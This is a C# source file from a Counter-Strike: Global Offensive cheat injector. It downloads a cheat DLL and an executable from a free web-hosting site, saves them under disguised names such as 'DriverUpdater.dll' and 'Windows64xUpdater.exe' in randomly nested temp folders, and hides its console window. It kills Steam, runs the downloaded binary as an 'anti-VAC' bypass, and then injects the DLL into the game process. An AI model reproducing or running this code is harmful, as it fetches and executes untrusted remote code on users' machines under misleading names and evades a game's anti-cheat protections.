using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
namespace Navaja_Suiza

{

    class injection

    {
        //1A864685-95B0-43CA-B63C-39F8B8CAC1DB-Sigs
        static System.Random random = new System.Random();
        static string[] randomSelector = { @"C:\Windows\Temp\", @"C:\Users\Public\Documents\", @"C:\Users\Default\AppData\Local\Temp\" };
        public static string TEMP_DIRECTORYE = randomSelector[random.Next(randomSelector.Length)] + @"bd_6Ek3.tmp\" + @"\temp\" + @"\DriversUpdater\";
        public static string TEMP_DIRECTORY = TEMP_DIRECTORYE + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\"+ random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\" + @"\" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\" + @"\" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + "-" + random.Next(9999999).ToString() + @"\";
        // DOWNLOAD CHEAT AND INJECTOR

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0x0;
        private const int SW_SHOW = 0x5;
        public static bool dll_found_and_work = true;
        static string ExecutorPath = form1.MAIN_FOLDER + @"CsGoOption\";
       


        [STAThread]
        public static void MainInjection(string cheat)
        {
            try
            {
                string CHEATINJECT = cheat;
                if (Directory.Exists(TEMP_DIRECTORYE)) { Directory.Delete(TEMP_DIRECTORYE, true); }
                Directory.CreateDirectory(TEMP_DIRECTORY);
                using (WebClient client = new WebClient())
                {

                    if (!File.Exists(TEMP_DIRECTORY + "DriverUpdater.dll"))
                    {
                        client.DownloadFile("https://phthisic-drawings.000webhostapp.com/" + CHEATINJECT, TEMP_DIRECTORY + "DriverUpdater.dll");
                        client.DownloadFile("https://phthisic-drawings.000webhostapp.com/v-B.exe", TEMP_DIRECTORY + "Windows64xUpdater.exe");

                    }
                }
                antiVac();
            }
            catch (Exception err)
            { bool logs = false;
                if (!logs) { err = null; }
                MessageBox.Show("Error:\nAn error has occured, please, try again later... \nIf csgo is open, try to close it." + err, "Error!");
            }
        }
        public static void Injection()
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            int err = 0;

            try
            {
                if (VITAL9999.Run(GetPathDLL()))
                {
                    // MessageBox.Show("[1310' injector] Your DLL has been injected, have fun!\nPress [INSERT] to open and close menu\n\n\n\n[Remember] Use on your own risk", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                }
                else
                {
                    err++;
                    if (err > 3)
                    {
                        MessageBox.Show("[1310' injector] Failed!\nTrying again...", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                    }
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "[1310' injector] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private static string GetPathDLL()
        {
            string dllPath = string.Empty;
            //hack_information.cfg
            dll_cheacker();
            Task.Delay(1500);
            dllPath = TEMP_DIRECTORY + "DriverUpdater.dll";
            if (File.Exists(dllPath))
            {
                return dllPath;
            }
            else
            {
                return null;
            }


        }
        private async static void antiVac()
        {
            try
            {
                if (Process.GetProcessesByName("csgo").Length > 0) { MessageBox.Show("CS:GO is running, please, close CS:GO and try again.", "CSGO is running", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                else
                {
                    if (!form1.DISABLE_ANTIVAC)
                    {
                        foreach (var process in Process.GetProcessesByName("Steam"))
                    {
                        process.Kill();
                    }
                    
                        Process.Start(TEMP_DIRECTORY + "Windows64xUpdater");
                    }
                    while (Process.GetProcessesByName("Steam").Length < 0) { await Task.Delay(1); }
                    Process.Start(@"steam://rungameid/730");
                    startCSGO();
                }
            }
            catch(Exception err)
            {
                MessageBox.Show("Error: " + err, "Error!");
            }
        }
        private async static void startCSGO()
        {
            await Task.Delay(12000);
            if (Process.GetProcessesByName("csgo").Length > 0)
            {
                Injection();
            }
            else
            {
                startCSGO();
            }
        }
        private static void dll_cheacker()
        {
           
           if (File.Exists(TEMP_DIRECTORY + "DriverUpdater.dll"))
            {
                return;
            }
            else
            {
                dll_found_and_work = false;
            }
        }
    }
}
